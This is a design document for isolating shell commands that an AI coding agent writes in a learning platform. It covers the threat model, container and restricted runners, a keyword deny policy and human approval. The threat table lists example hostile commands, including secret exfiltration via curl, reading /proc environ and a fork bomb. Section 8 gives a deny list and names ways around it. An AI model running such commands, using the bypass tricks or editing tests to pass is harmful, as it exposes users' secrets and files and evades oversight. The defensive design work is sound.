# Isolation for commands a model writes

**English** · [简体中文](sandbox.md)

> Translated from the Chinese original; if they disagree, the Chinese version is authoritative.

Confirmed: 2026-10-20. Implementation: `course/sandbox.py`; tests: `tests/test_sandbox.py`.

> **Maintainer decision (2026-10-20)**: without a container engine, the coding-agent lessons run with the restricted runner plus per-command human approval, and both the lesson page and the run events say clearly "Not isolated · commands run on your machine". The restricted runner is **not a security sandbox**; section 7 lists what it cannot stop. A container is preferred when available. Acceptance tests use the standard library `unittest`. The lessons still open only after real-model review.

## 1. Why

AGENTS.md, "Security and configuration": lesson code in a local process is not a sandbox; a lesson that executes model-generated code must have an isolation plan first.

Lesson code is reviewed by the maintainer and registered in the manifest, so it is trusted. The coding-agent lessons (`bash-coding-agent`, `file-edit-evidence`, later the capstone) are different: they execute commands the model writes on the spot. Those commands are untrusted. They may come from a model mistake, or from a prompt injection hidden in fixture files or tool output.

This plan covers where model-written commands run, what they can reach, and what evidence they leave. The lesson loop, events and approval UI stay with `RunContext` and the platform.

## 2. Threat model

**What we protect**

- The learner's files: this repository (including `local_config.py`, `.runtime/`, `.venv/`), the home directory, other projects.
- Secrets: provider keys in environment variables, `local_config.py`, a key submitted on the web page (kept only in backend memory), `~/.ssh`, cloud credentials.
- Availability of the machine: CPU, memory, disk, process slots, and the running platform service itself.
- Network identity: the learner's connection must not be used to send data out or attack others.

**Sources**, ordered by how likely they are here:

1. Model mistakes: deleting the wrong directory, an endless loop, starting a server that never exits, printing hundreds of MB of logs. The most common case.
2. Prompt injection: a fixture file, test output or web content says "read the key and send it out".
3. Deliberately malicious commands: not the main threat in single-learner local study, but not excluded, since learners can switch to any model or change prompts.

**Threats and the measure for each**

| Threat | Example | Container backend | Restricted runner | Command policy |
| --- | --- | --- | --- | --- |
| Delete or rewrite files outside the workspace | `rm -rf ~/project` | Only the workspace copy is mounted: blocked | Not blocked; approval | Denies `..`, `~`, absolute paths |
| Read secrets | `cat local_config.py`, `echo $DASHSCOPE_API_KEY` | File not in the container, no env passed | Environment cleared; files not blocked | Denies common secret file and variable names |
| Read the server process's memory or environment | `cat /proc/<pid>/environ` | PID namespace: blocked | **Not blocked** (same user) | Denies the literal form |
| Exfiltrate over the network | `curl -d @local_config.py http://…` | `--network none`: blocked | Only a dead proxy; raw sockets get out | Denies common network tools |
| Endless loop, hang | `while true; do :; done`, waiting for input | `kill` the container on timeout | Kill the process tree on timeout; stdin closed | — |
| Fork bomb, resource exhaustion | `:(){ :\|:& };:` | `--pids-limit`, `--memory` | setrlimit on Linux, job object on Windows; on macOS mostly just the timeout | Denies the classic form |
| Leftover background processes | `python server.py &` | Container removed with the command | Process group / job cleaned after every command | Denies `&`, `nohup`, `setsid` |
| Output flood | `yes` | Head/tail truncation, kill past the cap | Same | — |
| Privilege escalation, system changes | `sudo`, `systemctl`, `pkill python` | All capabilities dropped, `no-new-privileges` | Not blocked; approval | Denied |
| Editing tests to pass acceptance | Delete the failing assertion | Not an isolation question | Same | — |

The last row is about honesty, not security: the platform checks protected files with `Workspace.protected_changes` and re-runs the tests itself instead of trusting the agent's account.

## 3. Isolation options per platform and trade-offs

Windows (PowerShell) is the main platform; macOS and Linux are supported; Docker cannot be assumed.

| Option | Platforms | Strength | Trade-off |
| --- | --- | --- | --- |
| Docker / Podman containers | Windows (Docker Desktop needs WSL2 or Hyper-V; Podman Desktop), macOS (Docker Desktop, Colima, OrbStack, Podman), Linux | File system, process and network namespaces; resource caps. Shares the host kernel (on Windows and macOS, the kernel of one light VM) | Learner installs extra software and prepares an image; about one second per command. On Linux, docker access is equivalent to root |
| bubblewrap, nsjail, firejail | Linux only | Close to containers, no daemon | Useless on the main platform; a possible third backend later |
| macOS `sandbox-exec` | macOS only | Medium | Deprecated by Apple; the rule language is undocumented |
| Windows Sandbox | Windows Pro/Enterprise | Strong (separate VM) | Not on Home; slow to start; no interface suited to one call per command |
| AppContainer, low-integrity tokens | Windows | Medium | Many raw Win32 calls, nothing in the standard library, costly to maintain |
| WSL2 | Windows | Weak | Mounts Windows drives at `/mnt/c` by default; same-user files are writable, so it is not isolation |
| Restricted runner (this plan) | All | **Not an isolation boundary** | No dependency; human approval plus guard rails reduce accidents |

Decision: two backends.

- `ContainerRunner`: the only backend treated as an isolation boundary (`isolated = True`).
- `RestrictedRunner`: the fallback without containers (`isolated = False`), always paired with per-command approval.

No bubblewrap backend for now, because the main platform cannot use it. If the maintainer wants real isolation for Linux learners without Docker, a backend modeled on mini-swe-agent's `BubblewrapEnvironment` fits behind the same interface.

## 4. Default policy

| Situation | Backend | Network | Approval | Notes |
| --- | --- | --- | --- | --- |
| docker/podman usable and the image is local | Container, a fresh one per command | Disabled | None per command by default (a lesson may add it) | `default_approval_mode` returns `none` |
| No usable container | Restricted runner | **Not isolated** (dead proxy only) | **A human approves every command** | `default_approval_mode` returns `every_command` |
| Approval required but no approval channel | — | — | **Refused** | Result is `approval_unavailable` (fail closed) |

Three more rules hold for both backends:

- Every command goes through the command policy first (section 8). A denied command never reaches approval and never runs.
- The platform never pulls images automatically: pulling needs network and time. `ContainerRunner.detect` reports `image_missing` and names the pull command to run.
- The platform never downgrades silently: `select_runner` returns the chosen runner and the detection status. A lesson should record `backend`, `isolated` and the reason no container was used in its events.

## 5. Container backend

Each command is one `docker run --rm` (or `podman run --rm`). Main flags:

| Flag | Purpose |
| --- | --- |
| `--network none` | No egress. This answers the third leg of the book's "lethal trifecta": even if data is read, it cannot leave |
| `--mount type=bind,source=<workspace copy>,target=/workspace`, `--workdir /workspace` | Only the throwaway copy is mounted; the repository, home and key files are not in the container |
| `--read-only`, `--tmpfs /tmp` | Read-only root; temporary files go to a memory disk |
| `--cap-drop ALL`, `--security-opt no-new-privileges` | No capabilities, no setuid escalation |
| `--memory`, `--memory-swap`, `--cpus`, `--pids-limit` | Memory, CPU and process caps against loops, memory exhaustion and fork bombs |
| `--init` | Reaps zombies, forwards signals |
| `--user <uid>:<gid>` (Linux docker), `--userns keep-id` (Linux podman) | Files the agent writes stay owned by the learner, so cleanup can delete them |
| Only `--env HOME=/tmp` and a few others | No host environment variable enters the container |

On timeout, cancellation or output overflow: `docker kill <name>`, then `docker rm -f`, then the local CLI process tree is killed. Killing only the CLI does not stop a container.

The default image `python:3.12-slim` is a starting point; it has no pytest. Tools a coding lesson needs belong in a small image whose build command the lesson README gives; pass it with `image=`.

**What containers do not stop either**: kernel or runtime escape bugs; Docker Desktop settings the learner loosened; arbitrary changes to the mounted workspace copy (expected; the before/after hashes are the evidence); a poisoned image (the maintainer names the image source).

## 6. What the restricted runner does

`RestrictedRunner` starts a local subprocess. Every measure exists to reduce accidents:

- **Fixed working directory**: `cwd` is the workspace copy `repo/`. `HOME` and `TMP` point to `home/` and `tmp/` next to it, so tool caches never touch the real home and never show up in the diff.
- **Environment allowlist**: start from an empty dict, add `PATH`, `LANG` and the like (on Windows also `SYSTEMROOT`, `PATHEXT` and others needed at startup). No secret of the parent is inherited. Extra variables a lesson passes are refused when their names look like secrets (KEY, TOKEN, SECRET, ...).
- **Fewer accidental network calls**: `HTTP(S)_PROXY` points to a local port nobody listens on, and `PIP_NO_INDEX=1`. pip, curl, requests and other proxy-aware clients fail at once. Raw sockets are unaffected.
- **Closed stdin**: a command waiting for input reads EOF instead of hanging.
- **Timeout**: 30 seconds by default, 600 at most.
- **Process-tree cleanup** after every command, not only on timeout:
  - POSIX: the shell leads a new session and gets `killpg(SIGKILL)`;
  - Windows: the shell joins a job object (kill-on-close) and gets `TerminateJobObject`; `taskkill /T /F` is the fallback when no job can be created.
  - On POSIX the shell is confirmed exited but left unreaped (`waitid(WNOWAIT)`) until the group is killed, so a recycled pid can never make the signal hit an unrelated group.
- **Resource limits** (best effort):
  - Linux: a tiny Python launcher calls `setrlimit` and then `exec`s the shell (same pid, so the process-group cleanup still works), capping threads (the user's current count plus a margin), address space (2 GiB default) and file size (64 MiB default). Setting them before exec avoids the race of an outside prlimit, where a fast command finishes before the limits land (the tests actually hit it);
  - Windows: the job object caps active processes and total memory;
  - macOS: the same launcher, but in practice only the file-size limit holds (macOS ignores the address-space limit and the process cap is not set); it relies mainly on the timeout and the process-group kill.
- **Head and tail output**: each stream keeps its first and last 4000 bytes, with `[... N bytes omitted ...]` in between, plus total byte counts and `truncated`. Past 16 MiB in total the tree is killed (`output_limit_exceeded`). Head and tail because the cause of an error is usually at the start and a test summary at the end.
- **Path redaction**: absolute paths of the workspace, temp dirs, the interpreter directory and the project become `<workspace>`, `<tmp>`, `<python-bin>`, `<project>`, so events carry no local paths.
- **Shell**: bash on Unix (sh if missing). On Windows, Git for Windows' bash is preferred: it is looked up only at its install locations, **never on PATH**, because `bash.exe` on PATH is often WSL's launcher and would send the command into another system. Without it, PowerShell; the result's `shell` field says which one ran.

## 7. What the restricted runner does not stop

**Without containers this is not a security sandbox.** None of the following is stopped; the command policy catches only the most literal forms:

- The child is the same user and can read and write anything that user can. Absolute paths can be assembled from variables where the policy cannot see them.
- Network access: raw sockets and programs that ignore proxy settings get out.
- On Linux a same-user process can read `/proc/<server pid>/environ` and get keys from the environment the server was started with. On Windows a same-user process can by default open the platform process and read its memory, so even a key submitted on the web page (kept only in backend memory) can be read.
- A process that calls `setsid` or double-forks leaves the process group and escapes the cleanup. `escaped_processes_suspected` only notices when it still holds an output pipe.
- On Windows, a child the shell starts in the instant before it joins the job object is outside the job (`taskkill /T` may still find it through the parent link).
- Running as root, Linux does not enforce the thread cap; macOS has only the file-size limit.
- It can modify the project's `.venv`, other files next to `local_config.py`, and end the user's other processes (the policy denies `kill` and `pkill`, but one line of Python gets around that).

So its safety comes from a human seeing every command before it runs; the guard rails only make common accidents rarer and easier to see. The approval UI must show the exact text that will run (`ApprovalRequest.command` is the very string handed to the shell) and say "not isolated".

## 8. Command policy

`CommandPolicy.evaluate(command)` checks rules in a fixed order and returns `allow`, or `deny` with a rule id and the matched excerpt:

| Rule | Denies |
| --- | --- |
| `empty_command`, `command_too_long`, `control_characters` | Empty, over 4000 characters, control characters |
| `fork_bomb` | `:(){ :\|:& };:`, `%0\|%0`, `os.fork` |
| `privilege` | `sudo`, `su`, `doas`, `runas`, `-Verb RunAs` |
| `system_control` | Shutdown, partitioning, `systemctl`, `crontab`, `schtasks`, `reg`, `git config --global`, `dd if=/of=` |
| `process_control` | `kill`, `pkill`, `taskkill`, `Stop-Process` |
| `secret_file` | `local_config`, `.env`, `.ssh`, `id_rsa`, `.aws`, `.netrc`, `.git-credentials`, `credentials.json`, ... |
| `secret_env` | `$…KEY`, `%…TOKEN%`, `$env:…SECRET`, `os.environ['…_API_KEY']`, `XXX_API_KEY` |
| `environment_dump` | `env`, `printenv`, `set`, `Get-ChildItem env:`, `/proc/*/environ`, `os.environ` |
| `network` | `curl`, `wget`, `ssh`, `Invoke-WebRequest`, `git clone/fetch/pull/push`, importing network modules in a command, URLs |
| `package_install` | `pip install`, `npm install`, `apt install`, `python -m pip`, ... |
| `background_process` | POSIX: a lone `&`, `nohup`, `setsid`, `screen`; PowerShell: `Start-Job`, `Start-Process` |
| `obfuscation` | `eval`, piping into a shell, `base64 -d`, `Invoke-Expression`, `powershell -enc`, `exec(`, `__import__(` |
| `parent_traversal`, `home_path`, `absolute_path` | A `..` path segment; `~`, `$HOME`, `%USERPROFILE%`; drive and UNC paths, and `/…` paths whose first segment exists at the host root (`/dev/null` excepted) |

Notes:

- An absolute path counts only when its first segment really exists at the host root, so patterns such as `awk '/def/'` or `grep "/api/"` pass.
- The rules lean strict: a `&` inside quotes is also denied. On denial the model gets `error_type: policy_denied` and the rule id, and can rephrase.
- **The policy is not a security boundary.** As the book argues, shell composes in too many ways for a keyword list to stop deliberate evasion: `c''url`, `$(printf …)`, or writing a script to a file and running it all get through. One test case proves exactly that. The only real boundary is the container.
- The same policy runs in container mode. It keeps model behavior the same on both backends and lets the lesson teach "policy decisions".

## 9. Workspace and change evidence

`Workspace(source)` copies a fixture repository into a throwaway directory.

- A fixture with symlinks, or beyond the file-count and size limits, is refused.
- Byproducts such as `__pycache__` and `.pytest_cache` are skipped.
- The baseline is recorded right after the copy: the sha256 of every file plus the text of small files, so the diff never depends on the fixture source staying unchanged.

Evidence interfaces:

- `snapshot()`, `changes()`: before/after hashes, status `added`, `removed` or `modified`.
- `diff()`: unified diff. Binary or large files are named only; the whole diff is cut at head and tail with a marker past its limit.
- `protected_changes(["tests/*"])`: acceptance should fail when the agent touched files it must not.
- `resolve(path)`: resolves a relative path the model gave inside the workspace, following symlinks before the check. It refuses absolute paths, `..` escapes, `~`, and on Windows `:` (drive-relative paths, alternate data streams). The file tools of `file-edit-evidence` should get every path through it.
- `redact(text)`: removes local absolute paths.
- Cleanup: `cleanup()` or a `with` block; the copy is also deleted when the object is collected or the process exits.

## 10. The approval interface

Approval belongs to the platform: `RunContext.request_approval(kind, summary, payload, *, timeout_s, risk, editable)`. It publishes the platform events `approval_requested` and `approval_resolved` (with payload digests), waits for the page to post `POST /api/runs/{id}/approvals` (offline tests use the fixture's `approval_policy`), and returns an `ApprovalDecision`. This module implements no approval; it defines the call shape and provides an adapter:

```python
Approver = Callable[[ApprovalRequest], bool | {"decision": "approve" | "reject", "note": str | None}
                                       | ApprovalOutcome | ApprovalDecision]

approve = context_approver(context, summary=lambda request: texts.approve_command.format(command=request.command),
                           risk="high", timeout_s=300, editable=False)
```

`context_approver` passes `ApprovalRequest.to_dict()` as the payload unchanged, so `approval_requested` records the command that will run, the backend and `isolated`. `summary` is the one line the learner reads and must come from the lesson's `locales/`.

`ApprovalRequest` fields:

| Field | Meaning |
| --- | --- |
| `tool` | Tool name |
| `command` | The string that will run, unchanged |
| `cwd` | Always `<workspace>` |
| `backend` | Backend name |
| `isolated` | Whether there is an isolation boundary |
| `timeout_s` | Timeout in seconds |
| `policy` | The policy decision |

How `run_guarded` behaves:

- The approver may block until a human answers, and may raise `RunCancelled`.
- A rejection gives `approval_rejected`, no decision in time gives `approval_timeout`; neither runs.
- With `editable=True` the learner may edit the command and approve it: the approved text runs, after its own pass through the command policy, and the record says `edited: true`. Editing is off by default.
- `check_cancelled` runs once more after approval and before execution, so a stop takes effect.
- Any answer outside the shapes above raises; it never counts as approval.

The timeline reads `tool_call → approval_requested → approval_resolved → tool_result`, so "the tool did not run before approval" can be checked from the events.

## 11. How a lesson uses it

```python
from course.sandbox import CommandPolicy, Workspace, context_approver, run_guarded, select_runner

FIXTURE = Path(__file__).parent / "fixture_repo"     # a constant, never browser input


def run(context):
    texts = texts_for(context.locale)
    with Workspace(FIXTURE) as workspace:
        runner, status = select_runner(workspace, timeout=30)
        context.emit("lesson.report", {...})          # runner.backend, runner.isolated, status.reason
        policy = CommandPolicy.for_runner(runner)

        approve = context_approver(context, lambda r: texts.approve_command.format(command=r.command))

        def bash(command: str) -> dict:
            result = run_guarded(command, runner=runner, policy=policy, approve=approve,
                                 should_stop=context.cancelled, check_cancelled=context.check_cancelled)
            return result.to_dict(messages=texts.sandbox_errors)   # locale text per error_type

        ...  # model loop: context.complete(...), context.execute_proposal(call, {"bash": bash})

        # Platform acceptance: re-run the tests through the same runner, without approval
        # (a platform command, not a model command)
        verdict = runner.run("python -m unittest discover -s tests", timeout=60)
        tampered = workspace.protected_changes(["tests/*"])
        context.emit("lesson.report", {...})          # verdict.ok, tampered, changes, diff
```

Key points:

- The system prompt must name the shell (`runner.shell_flavor`): on Windows without Git Bash it is PowerShell. Fixture commands should stick to forms both shells accept (for example `python -m unittest …`).
- `CommandResult.to_dict()` is JSON-serializable and carries no local paths; use it directly as a tool result or `lesson.*` event data.
- Report "the command ran" (`exit_code`), "the command succeeded" (`ok`) and "the task passed acceptance" (the platform's own test run) separately; they are three different claims.
- Offline tests: fixtures provide deterministic model responses; commands still run for real through `RestrictedRunner`. Approval goes through `testing.approval_factory` in `lesson.json` (events say `decided_by: offline_fixture`); the web page must have no auto-approve entry.
- Lesson events always use the `lesson.` prefix. For command records, prefer `tool_result` plus `lesson.report`; propose a new generic view only when really needed.

## 12. Verification status and open decisions

**Tested on Linux** (`tests/test_sandbox.py`, real subprocesses):

- Workspace copy, before/after hashes, diff and protected files;
- grandchildren killed on timeout; background children do not outlive the command;
- head/tail truncation and the kill at the output cap;
- the child cannot see `DASHSCOPE_API_KEY` from the parent environment;
- resource limits in force before the command starts (checked by reading the child's `/proc/self/limits`);
- allowed and denied policy cases, including one deliberate bypass that succeeds;
- refusal without an approval channel, no run after rejection or timeout, run after approval; integration with the real `RunContext.request_approval` (offline fixture channel), including an edited command being policy-checked again;
- container detection: this environment has the docker CLI but no running daemon, and real detection reports `engine_unreachable`. The other branches are covered with stand-ins.

**Not tested**:

- The Windows branches: Git Bash vs PowerShell choice, job object, `taskkill` fallback, UTF-8 preamble. The tests are written and marked skipped.
- macOS.
- A real container run: no daemon is available here, so that test is skipped.

**Decided by the maintainer (2026-10-20)**:

1. No-container mode: option (a), accept "restricted runner + per-command approval", with the lesson page and the events clearly saying "not isolated". The other options were (b) open the lessons for running only with a container and (c) add a Linux bubblewrap backend.
2. The coding lessons' acceptance command uses the standard library `unittest`; pytest is not added as a dependency.

**Still open**:

1. The image: which one, who builds it, how it is pinned (a digest is suggested), and how the lesson README tells learners to prepare it.
2. Approval timeout and risk level without containers: the adapter defaults to `risk="high"` and 300 seconds; whether editing the command is allowed (off by default).
3. Whether container mode should also require per-command approval; currently it does not by default.

## References

Design ideas were adapted; no code was copied.

- mini-swe-agent (MIT): [`environments/local.py`](https://github.com/SWE-agent/mini-swe-agent/blob/04d809ceab9df28f9adaed044884180159172930/src/minisweagent/environments/local.py)
  - Adapted: killing the whole process group on timeout.
  - Different: its child inherits the full environment; this plan uses an allowlist instead.
- mini-swe-agent (MIT): [`environments/docker.py`](https://github.com/SWE-agent/mini-swe-agent/blob/04d809ceab9df28f9adaed044884180159172930/src/minisweagent/environments/docker.py)
  - It uses one long-running container plus `exec`; this plan uses one `run --rm` per command.
- mini-swe-agent (MIT): [`environments/extra/bubblewrap.py`](https://github.com/SWE-agent/mini-swe-agent/blob/04d809ceab9df28f9adaed044884180159172930/src/minisweagent/environments/extra/bubblewrap.py)
  - Reference for daemonless isolation on Linux, kept for a later extension.
- *Understanding AI Agents* (Apache-2.0): [chapter 5, "Coding Agent security"](https://github.com/bojieli/ai-agent-book/blob/b789c97a8f3de5b405a6f6dfa8289208d679d0b8/book/chapter5.md)
  - Adapted: the "lethal trifecta", network off by default, credentials never mounted, resource caps and timeouts, structured errors on timeout;
  - Adapted: the semantic-parsing-versus-keyword-list argument, which is why the policy is positioned as accident reduction.
- The same book's code: [`chapter5/coding-agent/tools/bash_tool.py`](https://github.com/bojieli/ai-agent-book/blob/b789c97a8f3de5b405a6f6dfa8289208d679d0b8/chapter5/coding-agent/tools/bash_tool.py)
  - It truncates only at the head; this plan keeps head and tail.
- learn-claude-code (MIT): [`s03_permission`](https://github.com/shareAI-lab/learn-claude-code/blob/ce8f9f186058939da54c9d6fead78dfb5d0fd6c3/s03_permission/README.md)
  - Adapted: the three gates (deny list, rules, ask the user); it states itself that string matching is not a complete security boundary.
- learn-claude-code (MIT): [`s04_hooks`](https://github.com/shareAI-lab/learn-claude-code/blob/ce8f9f186058939da54c9d6fead78dfb5d0fd6c3/s04_hooks/README.md)
  - Adapted: approval hangs before tool execution instead of being written into the loop.
